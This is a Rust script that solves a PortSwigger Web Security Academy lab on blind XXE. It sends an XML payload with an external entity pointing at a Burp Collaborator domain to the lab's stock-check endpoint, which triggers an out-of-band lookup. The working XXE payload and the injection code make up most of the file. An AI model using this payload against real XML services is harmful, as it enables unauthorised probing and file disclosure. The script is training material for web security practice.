/***************************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 15/10/2023
*
* Lab: Blind XXE with out-of-band interaction
*
* Steps: 1. Inject payload into 'productId' XML element to issue a DNS lookup to
*           burp collaborator using an external entity
*        2. Check your burp collaborator for the DNS lookup
*
****************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a29002d03c23eba81e1a34d001a00ca.web-security-academy.net";

    // change this to your collaborator domain
    let collaborator = "nlcdup3fxo5bqte3dcvbuetf46axysmh.oastify.com";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!("{} {}", "⟪#⟫ Injection point:".blue(), "productId".yellow(),);

    // payload to issue a DNS lookup to burp collaborator using an external entity
    let payload = format!(
        r###"<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://{collaborator}">]>
            <stockCheck>
                <productId>
                    &xxe;
                </productId>
                <storeId>
                    1
                </storeId>
            </stockCheck>"###
    );

    print!(
        "{}.. ",
        "❯ Injecting payload to issue a DNS lookup to burp collaborator using an external entity"
            .white()
    );
    io::stdout().flush();

    // fetch the page with the injected payload
    let injection = client
        .post(format!("{url}/product/stock"))
        .header("Content-Type", "application/xml")
        .body(payload)
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the page with the injected payload".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{}",
        "🗹 Check your burp collaborator for the DNS lookup"
            .white()
            .bold()
    );
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
